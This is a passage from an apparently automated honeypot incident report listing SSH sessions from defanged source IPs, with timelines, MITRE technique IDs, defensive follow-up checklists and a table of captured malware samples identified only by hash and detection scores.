- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d642f9c8fc0

| Field | Detail |
|---|---|
| **Source IP** | `103.174.103[.]19` |
| **First Seen** | 2026-07-17 18:07 |
| **Last Seen** | 2026-07-17 18:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:07:51` | `cowrie.session.connect` |
| `2026-07-17 18:07:51` | `cowrie.client.version` |
| `2026-07-17 18:07:51` | `cowrie.client.kex` |
| `2026-07-17 18:07:52` | `cowrie.login.success` |
| `2026-07-17 18:07:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.103[.]19` to AbuseIPDB if not already reported
- [ ] Block `103.174.103[.]19` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8108e6f39a9

| Field | Detail |
|---|---|
| **Source IP** | `111.70.49[.]182` |
| **First Seen** | 2026-07-17 18:09 |
| **Last Seen** | 2026-07-17 18:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:09:07` | `cowrie.session.connect` |
| `2026-07-17 18:09:08` | `cowrie.client.version` |
| `2026-07-17 18:09:08` | `cowrie.client.kex` |
| `2026-07-17 18:09:10` | `cowrie.login.success` |
| `2026-07-17 18:09:11` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:09:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.49[.]182` to AbuseIPDB if not already reported
- [ ] Block `111.70.49[.]182` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-758ea133cc84

| Field | Detail |
|---|---|
| **Source IP** | `119.207.49[.]167` |
| **First Seen** | 2026-07-17 18:09 |
| **Last Seen** | 2026-07-17 18:09 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:09:32` | `cowrie.session.connect` |
| `2026-07-17 18:09:32` | `cowrie.client.version` |
| `2026-07-17 18:09:32` | `cowrie.client.kex` |
| `2026-07-17 18:09:35` | `cowrie.login.success` |
| `2026-07-17 18:09:36` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:09:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `119.207.49[.]167` to AbuseIPDB if not already reported
- [ ] Block `119.207.49[.]167` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67079aa82963

| Field | Detail |
|---|---|
| **Source IP** | `101.47.15[.]119` |
| **First Seen** | 2026-07-17 18:12 |
| **Last Seen** | 2026-07-17 18:13 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:12:53` | `cowrie.session.connect` |
| `2026-07-17 18:13:05` | `cowrie.client.version` |
| `2026-07-17 18:13:05` | `cowrie.client.kex` |
| `2026-07-17 18:13:08` | `cowrie.login.success` |
| `2026-07-17 18:13:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.15[.]119` to AbuseIPDB if not already reported
- [ ] Block `101.47.15[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53b6c3de1fee

| Field | Detail |
|---|---|
| **Source IP** | `130.12.180[.]51` |
| **First Seen** | 2026-07-17 18:13 |
| **Last Seen** | 2026-07-17 18:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:13:08` | `cowrie.session.connect` |
| `2026-07-17 18:13:08` | `cowrie.client.version` |
| `2026-07-17 18:13:09` | `cowrie.client.kex` |
| `2026-07-17 18:13:09` | `cowrie.login.success` |
| `2026-07-17 18:13:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `130.12.180[.]51` to AbuseIPDB if not already reported
- [ ] Block `130.12.180[.]51` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30e84e7462e7

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 18:17 |
| **Last Seen** | 2026-07-17 18:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:17:12` | `cowrie.session.connect` |
| `2026-07-17 18:17:12` | `cowrie.client.version` |
| `2026-07-17 18:17:12` | `cowrie.client.kex` |
| `2026-07-17 18:17:12` | `cowrie.login.success` |
| `2026-07-17 18:17:13` | `cowrie.session.params` |
| `2026-07-17 18:17:13` | `cowrie.command.input` |
| `2026-07-17 18:17:13` | `cowrie.log.closed` |
| `2026-07-17 18:17:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e6f753b96c1

| Field | Detail |
|---|---|
| **Source IP** | `188.32.210[.]218` |
| **First Seen** | 2026-07-17 18:18 |
| **Last Seen** | 2026-07-17 18:18 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:18:00` | `cowrie.session.connect` |
| `2026-07-17 18:18:00` | `cowrie.client.version` |
| `2026-07-17 18:18:00` | `cowrie.client.kex` |
| `2026-07-17 18:18:00` | `cowrie.login.success` |
| `2026-07-17 18:18:44` | `cowrie.session.file_upload` |
| `2026-07-17 18:18:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `188.32.210[.]218` to AbuseIPDB if not already reported
- [ ] Block `188.32.210[.]218` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e0b87b341f5

| Field | Detail |
|---|---|
| **Source IP** | `78.25.127[.]202` |
| **First Seen** | 2026-07-17 18:24 |
| **Last Seen** | 2026-07-17 18:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:24:41` | `cowrie.session.connect` |
| `2026-07-17 18:24:41` | `cowrie.client.version` |
| `2026-07-17 18:24:41` | `cowrie.client.kex` |
| `2026-07-17 18:24:43` | `cowrie.login.success` |
| `2026-07-17 18:24:44` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.25.127[.]202` to AbuseIPDB if not already reported
- [ ] Block `78.25.127[.]202` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b809ee2c1ca

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]131` |
| **First Seen** | 2026-07-17 18:28 |
| **Last Seen** | 2026-07-17 18:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:28:17` | `cowrie.session.connect` |
| `2026-07-17 18:28:18` | `cowrie.client.version` |
| `2026-07-17 18:28:18` | `cowrie.client.kex` |
| `2026-07-17 18:28:19` | `cowrie.login.success` |
| `2026-07-17 18:28:19` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:28:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]131` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]131` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ef5f6292eb1

| Field | Detail |
|---|---|
| **Source IP** | `61.12.84[.]172` |
| **First Seen** | 2026-07-17 18:33 |
| **Last Seen** | 2026-07-17 18:33 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:33:10` | `cowrie.session.connect` |
| `2026-07-17 18:33:10` | `cowrie.client.version` |
| `2026-07-17 18:33:10` | `cowrie.client.kex` |
| `2026-07-17 18:33:12` | `cowrie.login.success` |
| `2026-07-17 18:33:12` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:33:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.12.84[.]172` to AbuseIPDB if not already reported
- [ ] Block `61.12.84[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b06414ed1363

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-07-17 18:33 |
| **Last Seen** | 2026-07-17 18:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:33:22` | `cowrie.session.connect` |
| `2026-07-17 18:33:23` | `cowrie.client.version` |
| `2026-07-17 18:33:23` | `cowrie.client.kex` |
| `2026-07-17 18:33:24` | `cowrie.login.success` |
| `2026-07-17 18:33:24` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:33:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3213c152914c

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-17 18:34 |
| **Last Seen** | 2026-07-17 18:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:34:11` | `cowrie.session.connect` |
| `2026-07-17 18:34:11` | `cowrie.client.version` |
| `2026-07-17 18:34:11` | `cowrie.client.kex` |
| `2026-07-17 18:34:11` | `cowrie.login.success` |
| `2026-07-17 18:34:12` | `cowrie.session.params` |
| `2026-07-17 18:34:12` | `cowrie.command.input` |
| `2026-07-17 18:34:12` | `cowrie.log.closed` |
| `2026-07-17 18:34:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d28f6b81371b

| Field | Detail |
|---|---|
| **Source IP** | `82.193.122[.]91` |
| **First Seen** | 2026-07-17 18:35 |
| **Last Seen** | 2026-07-17 18:35 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:35:39` | `cowrie.session.connect` |
| `2026-07-17 18:35:39` | `cowrie.client.version` |
| `2026-07-17 18:35:39` | `cowrie.client.kex` |
| `2026-07-17 18:35:40` | `cowrie.login.success` |
| `2026-07-17 18:35:40` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:35:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.193.122[.]91` to AbuseIPDB if not already reported
- [ ] Block `82.193.122[.]91` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a103cda562a

| Field | Detail |
|---|---|
| **Source IP** | `61.185.30[.]170` |
| **First Seen** | 2026-07-17 18:39 |
| **Last Seen** | 2026-07-17 18:39 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:39:11` | `cowrie.session.connect` |
| `2026-07-17 18:39:12` | `cowrie.client.version` |
| `2026-07-17 18:39:12` | `cowrie.client.kex` |
| `2026-07-17 18:39:14` | `cowrie.login.success` |
| `2026-07-17 18:39:14` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:39:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.185.30[.]170` to AbuseIPDB if not already reported
- [ ] Block `61.185.30[.]170` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e90bed836ba

| Field | Detail |
|---|---|
| **Source IP** | `180.76.57[.]94` |
| **First Seen** | 2026-07-17 18:40 |
| **Last Seen** | 2026-07-17 18:40 |
| **Session Duration** | 29s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:40:23` | `cowrie.session.connect` |
| `2026-07-17 18:40:23` | `cowrie.client.version` |
| `2026-07-17 18:40:33` | `cowrie.client.kex` |
| `2026-07-17 18:40:36` | `cowrie.login.success` |
| `2026-07-17 18:40:52` | `cowrie.session.params` |
| `2026-07-17 18:40:52` | `cowrie.command.input` |
| `2026-07-17 18:40:53` | `cowrie.log.closed` |
| `2026-07-17 18:40:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.57[.]94` to AbuseIPDB if not already reported
- [ ] Block `180.76.57[.]94` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c272e1786d90

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-17 18:42 |
| **Last Seen** | 2026-07-17 18:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:42:51` | `cowrie.session.connect` |
| `2026-07-17 18:42:51` | `cowrie.client.version` |
| `2026-07-17 18:42:51` | `cowrie.client.kex` |
| `2026-07-17 18:42:52` | `cowrie.login.success` |
| `2026-07-17 18:42:52` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:42:52` | `cowrie.direct-tcpip.data` |
| `2026-07-17 18:42:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0bc43dfd8ac

| Field | Detail |
|---|---|
| **Source IP** | `121.179.93[.]147` |
| **First Seen** | 2026-07-17 18:54 |
| **Last Seen** | 2026-07-17 18:54 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:54:34` | `cowrie.session.connect` |
| `2026-07-17 18:54:35` | `cowrie.client.version` |
| `2026-07-17 18:54:35` | `cowrie.client.kex` |
| `2026-07-17 18:54:38` | `cowrie.login.success` |
| `2026-07-17 18:54:39` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `121.179.93[.]147` to AbuseIPDB if not already reported
- [ ] Block `121.179.93[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-705ae38fc3b8

| Field | Detail |
|---|---|
| **Source IP** | `93.4.16[.]74` |
| **First Seen** | 2026-07-17 18:54 |
| **Last Seen** | 2026-07-17 18:54 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-17 18:54:45` | `cowrie.session.connect` |
| `2026-07-17 18:54:46` | `cowrie.client.version` |
| `2026-07-17 18:54:46` | `cowrie.client.kex` |
| `2026-07-17 18:54:47` | `cowrie.login.success` |
| `2026-07-17 18:54:47` | `cowrie.direct-tcpip.request` |
| `2026-07-17 18:54:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.4.16[.]74` to AbuseIPDB if not already reported
- [ ] Block `93.4.16[.]74` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `161.35.8[.]0` | **5** | 2026-07-17 17:06 | 2026-07-17 18:19 | 1m | 0 | `T1592` | 🟢 LOW |
| `194.165.16[.]162` | **3** | 2026-07-17 18:12 | 2026-07-17 18:12 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]155` | **3** | 2026-07-17 17:37 | 2026-07-17 17:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.96.139[.]126` | **2** | 2026-07-17 18:05 | 2026-07-17 18:05 | 0m | 0 | `T1592` | 🟢 LOW |
| `64.227.90[.]185` | **2** | 2026-07-17 18:09 | 2026-07-17 18:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `121.66.63[.]186` | 1 | 2026-07-17 17:34 | 2026-07-17 17:34 | 3s | 0 | `T1592` | 🟢 LOW |
| `155.4.209[.]51` | 1 | 2026-07-17 17:18 | 2026-07-17 17:20 | 120s | 0 | `T1592` | 🟢 LOW |
| `169.211.232[.]182` | 1 | 2026-07-17 18:53 | 2026-07-17 18:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `176.53.96[.]154` | 1 | 2026-07-17 17:22 | 2026-07-17 17:22 | 31s | 0 | `T1592` | 🟢 LOW |
| `188.166.223[.]22` | 1 | 2026-07-17 17:44 | 2026-07-17 17:45 | 39s | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]232` | 1 | 2026-07-17 17:25 | 2026-07-17 17:25 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `213.234.9[.]218` | 1 | 2026-07-17 16:55 | 2026-07-17 16:55 | 120s | 0 | `T1592` | 🟢 LOW |
| `222.139.245[.]137` | 1 | 2026-07-17 18:53 | 2026-07-17 18:53 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.148[.]2` | 1 | 2026-07-17 18:15 | 2026-07-17 18:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `59.46.182[.]10` | 1 | 2026-07-17 18:35 | 2026-07-17 18:37 | 120s | 0 | `T1592` | 🟢 LOW |
| `70.166.167[.]58` | 1 | 2026-07-17 17:00 | 2026-07-17 17:02 | 120s | 0 | `T1592` | 🟢 LOW |
| `79.136.8[.]69` | 1 | 2026-07-17 17:59 | 2026-07-17 18:01 | 120s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **40/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 52/100 | 🟡 MEDIUM | **30/74** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
